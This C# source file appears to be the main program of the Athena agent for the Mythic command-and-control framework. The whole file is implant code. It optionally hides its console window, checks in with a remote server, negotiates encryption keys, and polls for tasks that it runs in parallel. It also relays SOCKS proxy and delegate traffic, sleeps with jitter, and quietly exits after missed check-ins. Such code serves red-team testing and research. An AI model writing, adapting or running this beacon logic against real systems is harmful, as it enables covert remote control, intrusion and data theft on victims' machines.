using Athena.Commands;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.Linq;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;

namespace Athena
{

    class Program
    {


#if FORCE_HIDE_WINDOW
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
#endif

        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
#if FORCE_HIDE_WINDOW
            //Hide Console Window
            ShowWindow(GetConsoleWindow(), 0);
#endif
            AsyncMain().GetAwaiter().GetResult();
        }
        
        /// <summary>
        /// Main Loop (Async)
        /// </summary>
        /// <param name="args"></param>
        /// <returns></returns>
        static async Task AsyncMain() 
        { 
            int maxMissedCheckins = 10;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();

            //First Checkin-In attempt
            CheckinResponse res = await handleCheckin();
            
            if (!await updateAgentInfo(res))
            {
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            CommandHandler cmdHandler = new CommandHandler();

            //Main Loop
            while (!(missedCheckins == maxMissedCheckins) & !exit)
            {
                try
                {
                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.forwarder.GetMessages();
                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
                    List<object> responses = await cmdHandler.GetResponses();


                    List<MythicTask> tasks = await Globals.mc.GetTasks(responses, delegateMessages, socksMessages);

                    if(tasks is null)
                    {
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Environment.Exit(0);
                        }

                        //Return responses to waiting queue
                        await cmdHandler.AddResponse(responses);

                        missedCheckins++;
                    }
                    else
                    {
                        Parallel.ForEach(tasks, async c =>
                        {
                            await cmdHandler.StartJob(c);
                        });

                    }
                }
                catch (Exception e)
                {
                    missedCheckins++;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                await Task.Delay(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
        }

        /// <summary>
        /// Perform initial checkin with the Mythic server
        /// </summary>
        private static async Task<CheckinResponse> handleCheckin()
        {
            int maxMissedCheckins = 3;
            int missedCheckins = 0;
            CheckinResponse res = await Globals.mc.CheckIn();

            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res == null || res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Environment.Exit(0);
                    }

                    //Keep Trying
                    res = await Globals.mc.CheckIn();
                }
                catch (Exception e)
                {
                }
                //Sleep before attempting checkin again
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
            return res;
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private static async Task<bool> updateAgentInfo(CheckinResponse res)
        {
            try
            {
                Globals.mc.MythicConfig.uuid = res.id;
                if (Globals.mc.MythicConfig.currentConfig.encrypted)
                {
                    if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                    }
                    else
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

    }
}
